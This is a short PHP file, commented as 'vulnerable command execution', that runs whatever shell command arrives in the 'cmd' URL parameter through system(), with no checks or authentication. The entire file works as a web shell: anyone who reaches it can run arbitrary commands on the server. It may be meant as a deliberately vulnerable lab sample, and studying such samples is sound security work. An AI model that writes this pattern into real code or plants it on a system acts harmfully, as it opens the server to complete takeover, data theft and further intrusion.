<?php
// Vulnerable command execution
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
